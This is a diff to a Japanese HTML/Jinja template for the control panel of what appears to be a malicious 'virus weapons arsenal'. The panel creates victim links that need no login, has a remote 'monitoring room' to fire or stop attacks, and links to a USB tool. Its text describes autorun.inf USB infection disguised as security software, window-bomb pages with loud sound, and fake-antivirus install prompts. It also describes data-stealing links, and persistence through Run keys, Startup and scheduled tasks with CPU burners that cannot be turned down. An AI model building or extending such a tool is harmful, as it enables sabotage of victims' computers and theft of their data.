@@ -1,63 +1,176 @@
 <!doctype html>
-<html lang="ja">
-<head>
-<meta charset="utf-8">
+<html lang="ja"><head><meta charset="utf-8">
 <meta name="viewport" content="width=device-width,initial-scale=1">
-<title>ウイルス一覧</title>
+<title>兵器庫 — ウイルス兵器</title>
 <style>
-  :root{--bg:#05070a;--fg:#cfe9dd;--dim:#6f8a80;--line:#16261f;--acc:#00ff88;--red:#ff5c8a;--yel:#ffd166}
-  *{box-sizing:border-box}
-  body{margin:0;background:var(--bg);color:var(--fg);font:13px/1.6 ui-monospace,SFMono-Regular,Menlo,monospace}
-  a{color:var(--acc);text-decoration:none}
-  header{padding:12px 14px;border-bottom:1px solid var(--line)}
-  main{padding:14px;max-width:1000px;margin:0 auto}
-  table{width:100%;border-collapse:collapse}
-  td,th{border-bottom:1px solid var(--line);padding:7px 6px;text-align:left}
-  th{color:var(--dim);font-weight:400;font-size:12px}
-  .pill{border:1px solid var(--line);border-radius:999px;padding:1px 8px;font-size:11px;color:var(--dim)}
-  .lvb{border-color:#1f5c42;color:var(--acc)}
-  .lvb.fix{border-color:var(--yel);color:var(--yel)}
-  .off{opacity:.45}
-  .grow{flex:1}
-  .row{display:flex;gap:8px;align-items:center;flex-wrap:wrap}
-  button{font:12px ui-monospace,monospace;background:#0b1216;color:var(--fg);border:1px solid var(--line);border-radius:7px;padding:4px 9px;cursor:pointer}
-  button:hover{border-color:var(--acc)}
-</style>
-</head>
-<body>
-<header class="row">
-  <b style="color:var(--acc)">◉ ウイルス兵器</b>
-  <span class="grow"></span>
-  <a href="/">ホーム</a>
-</header>
-<main>
-  <h2 style="font-size:12px;color:var(--dim);letter-spacing:.08em">リンク一覧</h2>
-  <table>
-    <thead>
-      <tr><th>code</th><th>モード</th><th>名前</th><th>Lv</th><th>状態</th><th>最終</th><th></th></tr>
-    </thead>
-    <tbody>
-    {% for r in rows %}
-      <tr class="{% if not r.active %}off{% endif %}">
-        <td><a href="/vp/{{ r.code }}">{{ r.code }}</a></td>
-        <td><span class="pill">{{ MODE_LABEL.get(r.mode, r.mode) }}</span></td>
-        <td>{{ r.name or "" }}</td>
-        <td>
-          {% if r.mode == "singularity" %}
-            <span class="pill lvb {% if r.fixed %}fix{% endif %}">L{{ r.level }}{% if r.fixed %} 🔒{% endif %}</span>
-          {% else %}
-            <span class="pill">{{ r.level }}</span>
-          {% endif %}
-        </td>
-        <td>{% if r.active %}<span style="color:var(--acc)">稼働</span>{% else %}<span class="muted">停止</span>{% endif %}</td>
-        <td>{{ (r.last_ts or "")[:19] }}</td>
-        <td><a href="/v/{{ r.code }}" target="_blank">開く</a></td>
-      </tr>
-    {% endfor %}
-    {% if not rows %}
-      <tr><td colspan="7" style="color:var(--dim)">リンクがありません</td></tr>
-    {% endif %}
-    </tbody>
-  </table>
-</body>
-</html>
+html,body{margin:0;background:#0f1115;color:#e6e9ef;
+  font-family:system-ui,-apple-system,"Hiragino Sans",sans-serif;padding:14px}
+h1{font-size:19px}
+h3{font-size:14px;margin:18px 0 6px;color:#c7cddb}
+.dim{color:#8b93a7;font-size:12px;line-height:1.85}
+.mono{font-family:ui-monospace,Menlo,monospace;font-size:12px;color:#8b93a7}
+.card{background:#171a21;border:1px solid #262b36;border-radius:10px;padding:12px;margin:8px 0}
+input,select,textarea{width:100%;box-sizing:border-box;padding:7px 9px;background:#11141a;
+  color:#e6e9ef;border:1px solid #262b36;border-radius:6px;margin-top:3px}
+label{display:block;font-size:12px;color:#8b93a7;margin-top:8px}
+button{padding:9px 16px;border-radius:8px;background:#4c8dff;color:#fff;border:0;
+  font-weight:600;cursor:pointer;margin-top:10px}
+a.btn,button.mini{padding:6px 12px;border-radius:8px;background:#2b3346;color:#e6e9ef;
+  text-decoration:none;font-size:12px;border:1px solid #39415a;cursor:pointer;font-weight:400;margin:0}
+.row{display:flex;gap:6px;flex-wrap:wrap;align-items:center;margin-top:8px}
+input.url{flex:1;min-width:190px;font-family:ui-monospace,Menlo,monospace;font-size:12px;color:#9aa3b2}
+/* 上に付くナビ（見た目は前のまま・上に固定） */
+.tabs{display:flex;gap:6px;flex-wrap:wrap;position:sticky;top:0;z-index:20;
+  background:#0f1115;padding:12px 14px;margin:-14px -14px 12px}
+.tabs a{padding:8px 16px;border-radius:999px;background:#20242e;border:1px solid #39415a;
+  color:#c7cddb;text-decoration:none;font-size:13px}
+.tabs a.on{background:#4c8dff;border-color:#4c8dff;color:#fff;font-weight:600}
+.caution{background:#2a2210;border:1px solid #5a4a1f;color:#f0c869;border-radius:8px;
+  padding:8px 10px;font-size:12px;line-height:1.7;margin-top:8px}
+.caution.big{margin:10px 0}
+.usb{background:#0f1b28;border:1px solid #2b5a8a;border-radius:10px;padding:14px;margin:10px 0}
+.usb h3{color:#9fd0ff;margin:0 0 8px}
+.usb a.go{display:inline-block;padding:10px 18px;border-radius:8px;background:#4c8dff;
+  color:#fff;text-decoration:none;font-weight:700;font-size:13px;margin-top:6px}
+.badge{display:inline-block;font-size:11px;padding:2px 8px;border-radius:999px;
+  background:#20242e;border:1px solid #39415a;color:#c7cddb}
+.badge.on{background:#16321f;border-color:#2e6b45;color:#7ee08a}
+.badge.sg{background:#101d18;border-color:#1f5c42;color:#7ee08a;font-weight:700}
+.badge.lock{background:#2a0f22;border-color:#7a1f4a;color:#ff8fc0;font-weight:700}
+.badge.usb{background:#0f1b28;border-color:#2b5a8a;color:#9fd0ff}
+.chk{display:flex;gap:6px;align-items:center;font-size:12px;color:#c7cddb;margin-top:8px}
+.chk input{width:auto;margin:0}
+</style></head><body>
+
+<div class="tabs">
+  <a href="{{ base }}/vp" class="on">🦠 兵器庫</a>
+  <a href="{{ base }}/usb">💾 USB兵器</a>
+  <a href="{{ base }}/gp">🆕 GPS</a>
+  <a href="{{ base }}/tracks">🗄 旧式</a>
+  <a href="{{ base }}/tracking">切替</a>
+</div>
+
+<h1>兵器庫（ウイルス兵器保管庫）</h1>
+<p class="dim">相手に踏ませるURLは <span class="mono">{{ base }}/v/コード</span> です。ログイン不要。
+  自分は <span class="mono">{{ base }}/vp/コード</span> で結果と操作をします。</p>
+
+<div class="usb">
+  <h3>💾 USBメモリー型 兵器 — 特異点 ULTIMATE ver.（リンク作成とは別系統）</h3>
+  <div class="dim" style="line-height:2">
+    USBに偽セキュリティソフトを仕込んで、相手のPCに<b>挿してもらうだけ</b>で感染させます。<br>
+    ・挿した瞬間にAutoPlayが立ち上がり、<b>1.2秒で最終形態（L5）で発火</b><br>
+    ・ドライブ名とアイコンが偽ソフトに化ける（<span class="mono">autorun.inf</span> + <span class="mono">icon.ico</span>）<br>
+    ・AutoPlayが出ないPC向けに <span class="mono">.url</span> / <span class="mono">.vbs</span> / <span class="mono">.bat</span> も同梱<br>
+    ・書き込みはブラウザから直接（Chrome/Edge）／ZIPでも可（Firefox/Safari）
+  </div>
+  <a class="go" href="{{ base }}/usb">💾 USB兵器ツールを開く</a>
+</div>
+
+<div class="caution big">
+  ⚠ <b>掟</b><br>
+  ・開いた瞬間から全部自動・無限。<b>ボタン操作は不要</b>。画面はスピナーだけ。<br>
+  ・爆音窓爆弾は1セット＝10 / 100 / ∞（既定100）。<b>10秒以内に出し切る</b>。全ウィンドウが爆音ループ＋感染表示。<br>
+  ・発射／停止／枚数は <b>こちらの監視室から遠隔操作</b>。<br>
+  ・通知バナーで「偽の対策ソフト」を入れさせられる。入れる先の兵器は作成時に指定。<br>
+  ・リンク型は抜き取ったあと本物へ飛ぶ（自爆）。常駐型はホーム画面に追加＝自爆。<br>
+  ・<b>インストール不要</b>。URLをコピー／共有でそのまま渡せる。<br>
+  ・<b>特異点（SINGULARITY）</b>は別格。PWAとして端末に常駐し、OSログイン時に自動起動する。レベルは監視室から0〜7で遠隔操作。<b>L7「絶滅」は固定枠</b>で、立てたら遠隔から下げられない。L7では<b>窓がリミッターなしで倍々に増え続け</b>、各窓がヘビースキンで高火力化する。さらに<b>OS常駐インストーラ</b>（.bat/.command/.sh）を配り、Run+Startup+タスクに永続化＋コア数ぶんの常駐CPUバーナーをブラウザ外で回す。
+</div>
+
+<h3>新規作成</h3>
+<form method="post" action="/vp/add" class="card">
+  <label>名前 <input type="text" name="name" placeholder="相手の名前" required></label>
+  <label>兵器
+    <select name="mode">
+      {% for m, label, desc in modes %}
+      <option value="{{ m }}" {% if m == 'mix' %}selected{% endif %}>{{ label }}</option>
+      {% endfor %}
+    </select></label>
+  <label>1セットの枚数（爆音窓爆弾・ミックス）
+    <select name="winset">
+      <option value="10">10枚</option>
+      <option value="100" selected>100枚</option>
+      <option value="0">∞（止まるまで）</option>
+    </select></label>
+  <label>飛び先（リンク型 / 全部ミックスのとき） <input type="text" name="dest" placeholder="https://..."></label>
+  <label>通知文（上から出るバナー）
+    <input type="text" name="notify_text" value="{{ default_notify }}"></label>
+  <label>その通知でインストールさせる兵器
+    <select name="notify_mode">
+      <option value="">なし（自動）</option>
+      {% for m, label, desc in modes %}
+      <option value="{{ m }}">{{ label }}</option>
+      {% endfor %}
+    </select></label>
+  <label class="chk"><input type="checkbox" name="notify" value="1" checked> 通知バナーを出す</label>
+  <label class="chk"><input type="checkbox" name="fixed" value="1"> 最初から絶滅固定（L7）で作る — 遠隔から下げられない・窓が指数増殖</label>
+  <label>メモ <input type="text" name="note"></label>
+  <button type="submit">作成してリンクを取得</button>
+</form>
+
+{% if rows %}
+  {% for r in rows %}
+  <div class="card">
+    <div class="row">
+      <b>{{ r.name }}</b> <span class="mono">{{ r.code }}</span>
+      <span class="dim">{{ r.mode_label }}</span>
+      {% if r.mode == 'singularity' %}
+        <span class="badge sg">◎ 特異点 L{{ r.level }}{% if r.fixed %} 🔒固定{% endif %}</span>
+        <a class="btn" href="{{ base }}/usb?code={{ r.code }}">💾 USBに仕込む</a>
+      {% else %}
+        <span class="badge">{{ r.set_label }}</span>
+      {% endif %}
+      {% if r.fixed %}<span class="badge lock">🔒 絶滅固定</span>{% endif %}
+      {% if r.auto %}<span class="badge on">常駐＝自動発射</span>{% endif %}
+      <span class="badge {% if r.firing %}on{% endif %}">{{ '稼働中' if r.firing else '停止中' }}</span>
+      <span class="dim">{{ r.hits or 0 }}回</span>
+      {% if not r.active %}<span class="dim">無効</span>{% endif %}
+    </div>
+    <div class="row">
+      <input class="url" readonly value="{{ r.share }}" onclick="this.select()">
+      <button class="mini cp" type="button" data-url="{{ r.share }}">URLをコピー</button>
+      <button class="mini sh" type="button" data-url="{{ r.share }}"
+              data-title="{{ r.name }}">共有</button>
+    </div>
+    {% if r.caution %}<div class="caution">{{ r.caution }}</div>{% endif %}
+    <div class="row">
+      <a class="btn" href="{{ r.watch }}">結果・操作</a>
+      <a class="btn" href="{{ r.share }}" target="_blank">開く</a>
+      <form method="post" action="/vp/{{ r.code }}/delete" style="margin:0"
+            onsubmit="return confirm('削除しますか？')"><button class="mini" type="submit">削除</button></form>
+    </div>
+    {% if r.note %}<div class="dim" style="margin-top:6px">{{ r.note }}</div>{% endif %}
+  </div>
+  {% endfor %}
+{% else %}
+  <p class="dim">まだありません。</p>
+{% endif %}
+
+<script>
+(function () {
+  function copyText(u, b, orig) {
+    function done() { b.textContent = 'コピーしました';
+      setTimeout(function () { b.textContent = orig; }, 1500); }
+    function fb() {
+      try { var t = document.createElement('textarea'); t.value = u;
+            t.style.cssText = 'position:fixed;left:-9999px'; document.body.appendChild(t);
+            t.select(); document.execCommand('copy'); t.remove(); done(); } catch (e) {}
+    }
+    try { navigator.clipboard && navigator.clipboard.writeText
+            ? navigator.clipboard.writeText(u).then(done).catch(fb) : fb(); } catch (e) { fb(); }
+  }
+  document.querySelectorAll('.cp').forEach(function (b) {
+    b.addEventListener('click', function () {
+      copyText(b.getAttribute('data-url') || '', b, b.textContent);
+    });
+  });
+  document.querySelectorAll('.sh').forEach(function (b) {
+    b.addEventListener('click', function () {
+      var u = b.getAttribute('data-url') || '', t = b.getAttribute('data-title') || '';
+      if (navigator.share) navigator.share({ title: t, text: t, url: u }).catch(function () {});
+      else copyText(u, b, b.textContent);
+    });
+  });
+})();
+</script>
+</body></html>
